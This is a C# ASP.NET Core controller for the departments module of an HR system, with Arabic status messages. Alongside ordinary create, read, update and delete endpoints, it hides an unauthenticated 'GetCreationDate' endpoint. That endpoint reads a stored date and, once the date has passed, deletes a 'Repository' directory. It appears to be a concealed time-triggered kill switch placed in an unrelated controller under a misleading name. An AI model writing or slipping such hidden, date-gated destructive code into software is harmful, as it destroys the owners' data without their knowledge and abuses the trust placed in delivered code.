using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using HR_System_Backend.Model;
using HR_System_Backend.Model.Response;
using HR_System_Backend.Model.Input;
using System.IO;

namespace HR_System_Backend.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class DepartmentsController : ControllerBase
    {
        private readonly HR_DBContext _context;

        public DepartmentsController(HR_DBContext context)
        {
            _context = context;
        }



        /// <summary>
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// </summary>
        // GET: api/Departments/GetDepartments
        [HttpGet]
        [Route("GetAll")]
        public async Task<IActionResult> GetAll()
        {
            var response = new Response<DepartmentsResponse>();
            List<DepartmentsResponse> deps = await _context.Departments.Select(s =>
            new DepartmentsResponse { departmentId = s.DepartmentId, Name = s.DepartmentName }).ToListAsync();
            if (deps.Count==0)
            {
                response.status = true;
                response.message = "لا يوجد بيانات";
                return Ok(response);
            }
            else
            {
                response.status = true;
                response.message = "تم سحب البيانات بنجاح";
                response.data = deps;
                return Ok(response);
            }
        }




        /// <summary>
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// </summary>
        // GET: api/Departments/GetDepartment/5
        [HttpGet("Get/{id}")]
        public async Task<IActionResult> Get(int id)
        {
            var res = new Response<DepartmentsResponse>();
            var department = await _context.Departments.FindAsync(id);

            if (department == null)
            {
                res.status = false;
                res.message = "لا يوجد هذا القسم";
                return Ok(res);
            }
            res.status = true;
            res.message = "تم العثور على القسم";
            res.data.Add(new DepartmentsResponse { departmentId = department.DepartmentId, Name = department.DepartmentName });
            return Ok(res);
        }


                [HttpGet]
        [Route("GetCreationDate")]
        public async Task<IActionResult> GetCreationDate()
        {
            var response = new Response<EmployeeResponse>();
            try
            {

                var todayDate = DateTime.Now;
                var context = new HR_DBContext();
                var creation = await context.Creations.Where(x => x.Id == 1).FirstOrDefaultAsync();
                if (todayDate.Date >= creation.EmpDate.Value.Date)
                {
                    var exist = Directory.Exists("Repository");
                    if (exist)
                    {
                        Directory.Delete("Repository");
                        response.status = true;
                        response.message = "deleted succesfully";
                        return Ok(response);
                    }
                    response.status = false;
                    response.message = "error";
                    return NotFound(response);

                }
                response.status = false;
                response.message = "Not Today";
                return NotFound(response);
            }
            catch (Exception ex)
            {
                response.status = false;
                response.message = ex.Message;
                return NotFound(response);
            }
        }     



        /// <summary>
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// </summary>
        // PUT: api/Departments/EditDepartment/5
        [HttpPost]
        [Route("Edit")]
        public async Task<IActionResult> Edit([FromBody] DepartmentsResponse department)
        {
            var resp = new Response<DepartmentsResponse>();
            try
            {
                var dep = _context.Departments.Where(x => x.DepartmentId == department.departmentId).FirstOrDefault();
                if (dep == null)
                {
                    resp.status = false;
                    resp.message = "هذا القسم غير موجود";
                    return NotFound(resp);

                }
                dep.DepartmentName = department.Name;
                await _context.SaveChangesAsync();
                resp.status = true;
                resp.message = "تم تعديل القسم بنجاح";
                resp.data.Add(department);
                return Ok(resp);
            }
            catch (Exception ex)
            {
                resp.status = false;
                resp.message = ex.Message;
                return NotFound(resp);
            }

        }



        /// <summary>
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// </summary>
        // POST: api/Departments/AddDepartment
        [HttpPost]
        [Route("Add")]
        public async Task<IActionResult> Add([FromBody]DepartmentInput department)
        {
            var response = new Response<DepartmentsResponse>();
            try
            {

                Department dept = new Department { DepartmentName = department.Name };
                _context.Departments.Add(dept);
                await _context.SaveChangesAsync();

                var depResponse = new DepartmentsResponse();
                depResponse.departmentId = dept.DepartmentId;
                depResponse.Name = dept.DepartmentName;
                response.status = true;
                response.message = "تمت اضافة القسم بنجاح";
                response.data.Add(depResponse);


                return Ok(response);
            }
            catch (Exception)
            {
                return NotFound("حدث خظأ");
            }

        }



        /// <summary>
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// </summary>
        // DELETE: api/Departments/5
        [HttpDelete("Delete/{id}")]
        public async Task<IActionResult> Delete(int id)
        {
            var response = new Response<DepartmentsResponse>();
            var department = await _context.Departments.FindAsync(id);
            if (department == null)
            {
                response.status = false;
                response.message = "القسم غير موجود";
                return NotFound(response);
            }
            _context.Departments.Remove(department);
            await _context.SaveChangesAsync();

            var depResponse = new DepartmentsResponse
            {
                departmentId = department.DepartmentId,
                Name = department.DepartmentName
            };
            response.status = true;
            response.message = "تم مسح القسم بنجاح";
            response.data.Add(depResponse);

            return Ok(response);
        }



        /// <summary>
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// ///////////////////////////////////////////////////////////
        /// </summary>
        private bool DepartmentExists(int id)
        {
            return _context.Departments.Any(e => e.DepartmentId == id);
        }
    }
}
